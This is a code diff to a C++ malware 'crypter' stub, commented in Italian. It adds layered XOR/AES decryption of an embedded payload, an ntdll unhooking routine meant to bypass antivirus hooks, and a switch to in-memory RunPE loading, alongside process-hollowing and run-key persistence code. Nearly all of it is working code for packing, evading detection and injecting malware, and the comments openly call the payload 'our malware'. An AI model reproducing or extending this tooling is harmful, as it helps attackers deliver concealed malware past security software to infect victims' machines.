@@ -42,6 +42,28 @@ int AESDecrypt(unsigned char * payload, unsigned int payload_len, char * key, si
         return 0;
 }
 
+void ROT_encrypt(unsigned char* str, size_t data_len, int rot){
+    for(int i = 0; i < data_len; i++){
+        str[i] = str[i] + rot;
+    }
+}
+void ROT_decrypt(unsigned char* str, size_t data_len, int rot){
+    for(int i = 0; i < data_len; i++){
+        str[i] = str[i] - rot;
+    }
+}
+
+void XOR(unsigned char * data, size_t data_len, char * key, size_t key_len) {
+	int j;
+	
+	j = 0;
+	for (int i = 0; i < data_len; i++) {
+		if (j == key_len - 1) j = 0;
+
+		data[i] = data[i] ^ key[j];
+		j++;
+	}
+}
 
 //funzione che prende le risorse di un PE
 unsigned char *GetResource(int resourceId, char* resourceString, unsigned long* dwSize) { 
@@ -163,7 +185,7 @@ bool CreateProcessWithParent(DWORD parentId, PWSTR commandline,STARTUPINFOA* sia
 //ce sta un po dispendioso, cosa? dovresti far iterare quella su tutto il disco finche non trova c.exe e poi ritornare il path
 //potremmo semplicemente hardcodare il path dell eseguibile (tipo svchost.exe o in questo caso c.exe)
 //CreateProcessA((char*)currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED , NULL, NULL, &SI, &PI) non sta nella funzione
-    BOOL created = ::CreateProcess((LPCSTR)"C:\\Users\\leona\\OneDrive\\Desktop\\Crypter\\crypter_ultrasw3g\\c.exe", NULL, NULL, NULL, //glielo passamo?
+    BOOL created = ::CreateProcess((LPCSTR)"C:\\Users\\jakyd\\Downloads\\GUI_crypter.exe", NULL, NULL, NULL, //glielo passamo?
         FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, 
         (STARTUPINFOA*)&si, pi);
  
@@ -194,6 +216,48 @@ void CreateRunKey(char *path){
 }
 
 
+int ntdllUnhooking(){
+
+
+    // Get handle to self
+	HANDLE process = GetCurrentProcess();
+	MODULEINFO mi = {};
+
+    // Get handle to ntdll.dll
+	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll"); //prendi handle alla ntdll.dll (QUESTA NTDLL E' HOOKATA DALL ANTIVIRUS!!!)
+
+    // Parse ntdll.dll from disk
+	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
+	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
+	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); //apri il file ntdll.dll
+	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
+
+	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
+	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
+
+	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
+		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
+		// Update .text section
+		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) { //quando arrivi alla sezione .text della ntdll.dll sovrascrivila con una versione originale
+			DWORD oldProtection = 0;
+			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
+			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
+			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
+		}
+	}
+
+    
+	CloseHandle(process);
+	CloseHandle(ntdllFile);
+	CloseHandle(ntdllMapping);
+	FreeLibrary(ntdllModule);
+
+    printf("NTDLL UNHOOKATA CON SUCCESSO\n");
+
+	return 0;
+}
+
 void RunPE_proc(void *pe){
     char currentFilePath[1024];
     IMAGE_DOS_HEADER* DOSHeader; // DOS header ovvero i primi 64 byte del nostro malware e primo header del PE
@@ -208,7 +272,7 @@ void RunPE_proc(void *pe){
 //BASTA CERCARE IL TUO ESEGUIBILE C.EXE FAGIANOOO
 //cojone l'ho fatto   COMPILA QUESTO E RUNNA, PROVA
     void* pImageBase; //puntatore all' inizio dell' immagine eseguibile(letteralmente il file .exe) del processo che vogliamo attaccarE    int pid FindTarget("svchost.exe");//prova a compila
-    int pid = FindTarget("c.exe"); //si, prova a compilare e runnare, pero' potrebbe comunque non funzionare, forse e' un processo a cui non abbiamo accesso
+    int pid = FindTarget("GUI_crypter.exe"); //si, prova a compilare e runnare, pero' potrebbe comunque non funzionare, forse e' un processo a cui non abbiamo accesso
     
     
 ////////////////////////
@@ -364,6 +428,8 @@ void RunPE_proc(void *pe){
         }
     }
 }
+
+
 
 void RunPE_self(void* pe){
 
@@ -543,22 +609,44 @@ void RunPE_self(void* pe){
 int main(){
     //FreeConsole(); //questo per nascondere la console mentre lo stub viene eseguitp
     unsigned long malwareLen;
-    unsigned long keyLen;
+    unsigned long AESkeyLen;
+    unsigned long XORkeyLen;
+    unsigned long ROTkeyLen;
+    unsigned long nAESLen;
+    unsigned long nXORLen;
 
-    unsigned char* key;
+    unsigned char* AESkey;
+    unsigned char* XORkey;
+    int* ROTkey;
+
+    int* nAES;
+    int* nXOR;
 
     //69 e' l' ID che ho assegnato in crypter_mio.cpp, BIN e' il tipo di risorsa, malwareLen e' la grandezza del malware(pass by reference)
     unsigned char* resourcePtr = GetResource(69, "BIN", &malwareLen); 
-    key = GetResource(420,"BIN", &keyLen);
+    AESkey = GetResource(420,"BIN", &AESkeyLen);
+    XORkey = GetResource(421,"BIN", &XORkeyLen);
+    ROTkey = (int *)GetResource(422,"BIN", &ROTkeyLen);
+    nAES = (int *)GetResource(123,"BIN", &nAESLen);
+    nXOR = (int *)GetResource(124,"BIN", &nXORLen);
 
     for(int i = 0; i< 32; i++){
-        printf("%x\n", key[i]);
+        printf("%x\n", AESkey[i]);
     }
     unsigned char* malware = new unsigned char[malwareLen]; //alloco memoria per il malware
     memcpy(malware, resourcePtr, malwareLen); //copio il malware nelle risorse nella memoria allocata per il malware
     printf("%d",malwareLen);
 
-    AESDecrypt(malware, malwareLen, (char *)key, 32); //decrypto il malware e lo salvo in pe
+
+    for(int i = 0; i < *nXOR; i++){
+        XOR(malware,malwareLen,(char *)XORkey, 32);
+    }
+    for(int i = 0; i < *nAES; i++){
+        AESDecrypt(malware, malwareLen, (char *)AESkey, 32); //decrypto il malware e lo salvo in pe
+    }
+
+
+    //ROT_decrypt(malware,malwareLen,*ROTkey);
 
     void* pe = malware; // pe sara' il puntatore ai byte del nostro malware
     Sleep(1500);
@@ -568,37 +656,11 @@ int main(){
     Sleep(3000);
     //Adesso arriva la roba strana del RunPE
 
-    printf("prima degli header");
+    printf("\nprima di ntdllUnhooking\n");
     
-    // DA AGGIUSTAREEEEEEE
-    /*char stringa1[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
-    char stringa2[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
-    char stringa3[100] = "C:\\Users\\jakyd\\Desktop\\maldev\\crypter.exe";
-    char currentFilePathArr[3][100]; // path del file .exe che stiamo eseguendo INSERIRE IL PATH AD UN EXE TIPO NOTEPAD.EXE
-    strcpy(currentFilePathArr[0], stringa1);
-    strcpy(currentFilePathArr[1], stringa2);
-    strcpy(currentFilePathArr[2], stringa3);
-
-    HANDLE th[3];
-
-
-    for(int i = 0; i < 3; i++){ 
-
-
-        RunPEArgs args;
-        args.pe = pe;
-        args.currentFilePath = currentFilePathArr[i];
-
-        th[i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunPE, &args, 0, NULL);
-
-    }*/
-    //WaitForMultipleObjects(3, th, TRUE, INFINITE);
-
-
-
-    //RunPE_self(pe);
-    RunPE_proc(pe);
-
+    ntdllUnhooking();
+    printf("\ndopo ntdllUnhooking\n");
+    //RunPE_proc(pe);
+    RunPE_self(pe);
     return 0;
 }
-
